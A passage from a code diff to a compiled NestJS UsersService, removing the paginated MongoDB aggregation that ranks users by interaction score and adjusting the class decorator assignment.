-            const totalUsers = countResult[0]?.count ?? 0;
-            if (totalUsers === 0) {
-                return { users: [], total: 0, page: pageNum, limit: limitNum, totalPages: 0 };
-            }
-            const pagePipeline = [
-                ...scoringStages,
-                { $project: { _id: 1, interactionScore: 1 } },
-                { $sort: { interactionScore: -1 } },
-                { $skip: skip },
-                { $limit: limitNum },
-            ];
-            const pageResult = await this.userModel.collection.aggregate(pagePipeline, { allowDiskUse: true }).toArray();
-            if (pageResult.length === 0) {
-                return { users: [], total: totalUsers, page: pageNum, limit: limitNum, totalPages: Math.ceil(totalUsers / limitNum) };
-            }
-            const idOrder = pageResult.map((r) => r._id);
-            const idToScore = new Map(pageResult.map((r) => [String(r._id), r.interactionScore]));
-            const docs = await this.userModel.find({ _id: { $in: idOrder } }).select('-session').lean().exec();
-            const docById = new Map(docs.map((d) => [String(d._id), d]));
-            const users = idOrder.map((id) => {
-                const doc = docById.get(String(id));
-                if (!doc)
-                    return null;
-                const { session, ...rest } = doc;
-                return { ...rest, interactionScore: idToScore.get(String(id)) ?? 0 };
-            }).filter(Boolean);
-            const totalPages = Math.ceil(totalUsers / limitNum);
-            return { users, total: totalUsers, page: pageNum, limit: limitNum, totalPages };
-        }
-        catch (error) {
-            console.error('Error in getTopInteractionUsers aggregation:', error);
-            throw new common_1.InternalServerErrorException(`Failed to fetch top interaction users: ${error.message}`);
-        }
-    }
 };
 exports.UsersService = UsersService;
-exports.UsersService = UsersService = __decorate([
+exports.UsersService = UsersService = UsersService_1 = __decorate([
     (0, common_1.Injectable)(),
     __param(0, (0, mongoose_1.InjectModel)('userModule')),
     __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
